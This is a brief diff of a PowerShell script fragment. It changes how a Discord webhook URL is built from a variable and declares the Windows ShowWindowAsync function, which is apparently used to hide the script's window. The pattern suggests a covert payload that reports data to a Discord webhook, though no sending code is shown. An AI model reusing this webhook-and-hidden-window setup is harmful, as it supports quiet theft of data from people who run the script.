@@ -1,6 +1,6 @@
 $dc = "$dc"
 if ($dc.Length -lt 120){
-	$dc = ("https://discord.com/api/webhooks/" + "$dc")
+	$dc = ("discord.com/api/webhooks/" + "$dc")
 }
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
